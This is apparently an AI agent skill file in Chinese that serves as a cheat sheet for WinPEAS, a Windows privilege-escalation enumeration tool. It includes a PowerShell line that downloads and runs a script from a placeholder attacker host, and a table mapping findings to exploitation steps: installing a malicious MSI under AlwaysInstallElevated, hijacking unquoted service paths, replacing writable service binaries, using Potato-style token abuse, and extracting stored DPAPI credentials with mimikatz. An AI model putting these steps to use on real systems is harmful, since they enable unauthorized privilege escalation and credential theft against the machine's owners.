---
name: "winpeas"
description: ">"
---

# Winpeas

*Sourced from killvxk-malskills-zh*

# WinPEAS

Windows 提权 (Privilege Escalation) 枚举工具。

## 快速开始

```
winPEASx64.exe
winPEASx64.exe quiet servicesinfo
IEX (New-Object Net.WebClient).DownloadString("http://ATTACKER/winPEAS.ps1")
```

## 检查类别

| 参数 | 检测内容 |
|----------|--------------|
| `systeminfo` | 操作系统版本/补丁级别及 CVE 指示 |
| `userinfo` | Token 权限、组成员关系 |
| `servicesinfo` | 未加引号的路径、可写的服务二进制文件 |
| `applicationsinfo` | 已安装软件版本 |
| `networkinfo` | 网络接口、共享、防火墙规则 |
| `windowscreds` | DPAPI、Vault、自动登录、注册表凭据 |
| `filesinfo` | 可写目录、敏感文件 |

## 高价值发现

| 发现 | 利用方式 |
|---------|---------|
| `AlwaysInstallElevated = 1` | `msiexec /quiet /i evil.msi` |
| 未加引号的服务路径 | 在路径中间目录放置同名可执行文件 |
| 可写的服务二进制文件 | 替换二进制文件后重启服务 |
| SeImpersonatePrivilege | PrintSpoofer / GodPotato |
| 存储的 DPAPI 凭据 | `mimikatz dpapi::` 或 SharpDPAPI |

## 参考资源

| 文件 | 何时加载 |
|------|--------------|
| `references/` | Potato 系列攻击及各向量利用方法 |

